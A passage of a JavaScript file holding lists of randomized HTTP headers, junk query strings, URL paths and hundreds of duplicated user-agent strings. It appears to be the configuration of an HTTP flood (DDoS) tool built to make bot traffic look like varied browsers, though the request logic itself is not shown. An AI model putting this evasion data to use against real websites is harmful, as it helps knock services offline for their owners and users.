  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,en-US;q=0.5',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-external-parsed-entity;q=0.9',
  'text/html; charset=utf-8',
  'application/json, text/plain, */*',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
],

encoding_header = [
  'gzip, deflate, br',
  'compress, gzip',
  'deflate, gzip',
  'gzip, identity',
  '*'
],

controle_header = ['no-cache', 'no-store', 'no-transform', 'only-if-cached', 'max-age=0', 'must-revalidate', 'public', 'private', 'proxy-revalidate', 's-maxage=86400'];

const Methods = [
   "GET"
];
const randomMethod = Methods[Math.floor(Math.random() * Methods.length)];

const queryStrings = [
  "&", 
  "=",
  "?",
  "*",
  "",
  ".",   // <-- ADD COMMA HERE
  "+",
  "!",
  "-",
  "#",
];

const pathts = [
  "/",
  "?page=1",
  "?page=2",
  "?page=3",
  "?category=news",
  "?category=sports",
  "?category=technology",
  "?category=entertainment", 
  "?sort=newest",
  "?filter=popular",
  "?limit=10",
  "?start_date=1989-06-04",
  "?end_date=1989-06-04",
];

const uap = [
"POLARIS/6.01(BREW 3.1.5;U;en-us;LG;LX265;POLARIS/6.01/WAP;)MMP/2.0 profile/MIDP-201 Configuration /CLDC-1.1", 
"POLARIS/6.01 (BREW 3.1.5; U; en-us; LG; LX265; POLARIS/6.01/WAP) MMP/2.0 profile/MIDP-2.1 Configuration/CLDC-1.1", 
"portalmmm/2.0 N410i(c20;TB) ", 
'Python-urllib/2.5', 
"SAMSUNG-S8000/S8000XXIF3 SHP/VPP/R5 Jasmine/1.0 Nextreaming SMM-MMS/1.2.0 profile/MIDP-2.0 Configuration/CLDC-1.1 FirePHP/0.3", 
"SAMSUNG-SGH-A867/A867UCHJ3 SHP/VPP/R5 NetFront/35 SMM-MMS/1.2.0 profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.1.13.0", 
"SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1;  http://www.google.com/bot.html )", 
"SearchExpress", 
"SEC-SGHE900/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 Opera/8.01 (J2ME/MIDP; Opera Mini/2.0.4509/1378; nl; U; ssr)", 
"SEC-SGHX210/1.0 UP.Link/6.3.1.13.0", 
"SEC-SGHX820/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1", 
"SonyEricssonK310iv/R4DA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.1.13.0", 
"SonyEricssonK550i/R1JD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", 
"SonyEricssonK610i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", 
"SonyEricssonK750i/R1CA Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0", 
"SonyEricssonK800i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0", 
"SonyEricssonK810i/R1KG Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", 
"SonyEricssonS500i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", 
"SonyEricssonT100/R101", 
"Opera/9.80 (Macintosh; Intel Mac OS X 10.4.11; U; en) Presto/2.7.62 Version/11.00", 
'Opera/9.80 (S60; SymbOS; Opera Mobi/499; U; ru) Presto/2.4.18 Version/10.00', 
"Opera/9.80 (Windows NT 5.2; U; en) Presto/2.2.15 Version/10.10", 
"Opera/9.80 (Windows NT 6.1; U; en) Presto/2.7.62 Version/11.01", 
"Opera/9.80 (X11; Linux i686; U; en) Presto/2.2.15 Version/10.10", 
"Opera/10.61 (J2ME/MIDP; Opera Mini/5.1.21219/19.999; en-US; rv:1.9.3a5) WebKit/534.5 Presto/2.6.30", 
"SonyEricssonT610/R201 Profile/MIDP-1.0 Configuration/CLDC-1.0", 
"SonyEricssonT650i/R7AA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", 
"SonyEricssonT68/R201A", 
"SonyEricssonW580i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", 
"SonyEricssonW660i/R6AD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", 
"SonyEricssonW810i/R4EA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0", 
"SonyEricssonW850i/R1ED Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", 
"SonyEricssonW950i/R100 Mozilla/4.0 (compatible; MSIE 6.0; Symbian OS; 323) Opera 8.60 [en-US]", 
"SonyEricssonW995/R1EA Profile/MIDP-2.1 Configuration/CLDC-1.1 UNTRUSTED/1.0", 
'SonyEricssonZ800/R1Y Browser/SEMC-Browser/4.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0', 
"BlackBerry9000/4.6.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102", 
"BlackBerry9530/4.7.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102 UP.Link/6.3.1.20.0", 
"BlackBerry9700/5.0.0.351 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/123",
// Generated browser types
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0",
"Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 OPR/98.0.0.0",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 OPR/98.0.0.0 (Edition GX)",
// StevenStore User Agents
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:112.0) Gecko/20100101 Firefox/112.0",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Edg/112.0.1722.46",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.49 Safari/537.36 OPR/88.0.4412.40",
"Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-G780F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/112.0.5615.49 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.49 Mobile Safari/537.36",
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 14; Galaxy Z Flip5) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/123.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:2.0) Treco/20110515 Fireweb Navigator/2.4",
"Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 14; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 14; SM-S721B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 14; SM-X920N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 14; SM-X826N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 14; SM-F956B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 14; SM-F741N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 14; SM-F958N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 14; SM-A047F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 14; SM-A042M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 14; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 14; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 14; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 14; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 14; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 14; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36",
"Mozilla/5.0 (Android 14; Mobile; rv:68.0) Gecko/68.0 Firefox/118.0",
"Mozilla/5.0 (Android 14; Mobile; LG-M255; rv:118.0) Gecko/118.0 Firefox/118.0",
"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/118.0.5993.69 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/118.0 Mobile/15E148 Safari/605.1.15",
"Mozilla/5.0 (Linux; Android 10; HD1913) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53",
"Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53",
"Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53",
"Mozilla/5.0 (Linux; Android 10; ONEPLUS A6003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53",
"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 EdgiOS/117.2045.65 Mobile/15E148 Safari/605.1.15",
// Script 2 UAs
"Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html )",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/85.7 (KHTML, like Gecko) Safari/85.7",
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36 OPR/87.0.4390.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0',
'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36 OPR/88.0.4412.40',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36 OPR/87.0.4390.45',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edge/12.0',
        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edge/12.0',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edge/12.0',
        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edge/12.0',
        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edge/12.0',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edge/12.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edge/12.0',
        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edge/12.0',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edge/12.0',
        'POLARIS/6.01(BREW 3.1.5;U;en-us;LG;LX265;POLARIS/6.01/WAP;)MMP/2.0 profile/MIDP-201 Configuration /CLDC-1.1',
  'POLARIS/6.01 (BREW 3.1.5; U; en-us; LG; LX265; POLARIS/6.01/WAP) MMP/2.0 profile/MIDP-2.1 Configuration/CLDC-1.1',
  'portalmmm/2.0 N410i(c20;TB) ',
  'Python-urllib/2.5',
  'SAMSUNG-S8000/S8000XXIF3 SHP/VPP/R5 Jasmine/1.0 Nextreaming SMM-MMS/1.2.0 profile/MIDP-2.1 configuration/CLDC-1.1 FirePHP/0.3',
  'SAMSUNG-SGH-A867/A867UCHJ3 SHP/VPP/R5 NetFront/35 SMM-MMS/1.2.0 profile/MIDP-2.0 configuration/CLDC-1.1 UP.Link/6.3.0.0.0',
  'SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1;  http://www.google.com/bot.html )',
  'SearchExpress',
  'SEC-SGHE900/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 Opera/8.01 (J2ME/MIDP; Opera Mini/2.0.4509/1378; nl; U; ssr)',
  'SEC-SGHX210/1.0 UP.Link/6.3.1.13.0',
  'SEC-SGHX820/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1',
  'SonyEricssonK310iv/R4DA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.1.13.0',
  'SonyEricssonK550i/R1JD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1',
  'SonyEricssonK610i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1',
  'SonyEricssonK750i/R1CA Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1',
  'SonyEricssonK800i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0',
  'SonyEricssonK810i/R1KG Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1',
  'SonyEricssonS500i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1',
  'SonyEricssonT100/R101',
  'Opera/9.80 (Macintosh; Intel Mac OS X 10.4.11; U; en) Presto/2.7.62 Version/11.00',
  'Opera/9.80 (S60; SymbOS; Opera Mobi/499; U; ru) Presto/2.4.18 Version/10.00',
  'Opera/9.80 (Windows NT 5.2; U; en) Presto/2.2.15 Version/10.10',
  'Opera/9.80 (Windows NT 6.1; U; en) Presto/2.7.62 Version/11.01',
  'Opera/9.80 (X11; Linux i686; U; en) Presto/2.2.15 Version/10.10',
  'Opera/10.61 (J2ME/MIDP; Opera Mini/5.1.21219/19.999; en-US; rv:1.9.3a5) WebKit/534.5 Presto/2.6.30',
  'SonyEricssonT610/R201 Profile/MIDP-1.0 Configuration/CLDC-1.0',
  'SonyEricssonT650i/R7AA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1',
  'SonyEricssonT68/R201A',
  'SonyEricssonW580i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1',
  'SonyEricssonW660i/R6AD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1',
  'SonyEricssonW810i/R4EA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0',
  'SonyEricssonW850i/R1ED Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1',
  'SonyEricssonW950i/R100 Mozilla/4.0 (compatible; MSIE 6.0; Symbian OS; 323) Opera 8.60 [en-US]',
  'SonyEricssonW995/R1EA Profile/MIDP-2.1 Configuration/CLDC-1.1 UNTRUSTED/1.0',
  'SonyEricssonZ800/R1Y Browser/SEMC-Browser/4.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0',
  'BlackBerry9000/4.6.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102',
  'BlackBerry9530/4.7.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102 UP.Link/6.3.1.20.0',
  'BlackBerry9700/5.0.0.351 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/123',
  'POLARIS/6.01(BREW 3.1.5;U;en-us;LG;LX265;POLARIS/6.01/WAP;)MMP/2.0 profile/MIDP-201 Configuration /CLDC-1.1', 'POLARIS/6.01 (BREW 3.1.5; U; en-us; LG; LX265; POLARIS/6.01/WAP) MMP/2.0 profile/MIDP-2.1 Configuration/CLDC-1.1', 'portalmmm/2.0 N410i(c20;TB) ', 'Python-urllib/2.5', 'SAMSUNG-S8000/S8000XXIF3 SHP/VPP/R5 Jasmine/1.0 Nextreaming SMM-MMS/1.2.0 profile/MIDP-2.1 configuration/CLDC-1.1 FirePHP/0.3', 'SAMSUNG-SGH-A867/A867UCHJ3 SHP/VPP/R5 NetFront/35 SMM-MMS/1.2.0 profile/MIDP-2.0 configuration/CLDC-1.1 UP.Link/6.3.0.0.0', 'SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1;  http://www.google.com/bot.html )', 'SearchExpress', 'SEC-SGHE900/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 Opera/8.01 (J2ME/MIDP; Opera Mini/2.0.4509/1378; nl; U; ssr)', 'SEC-SGHX210/1.0 UP.Link/6.3.1.13.0', 'SEC-SGHX820/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1', 'SonyEricssonK310iv/R4DA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.1.13.0', 'SonyEricssonK550i/R1JD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1', 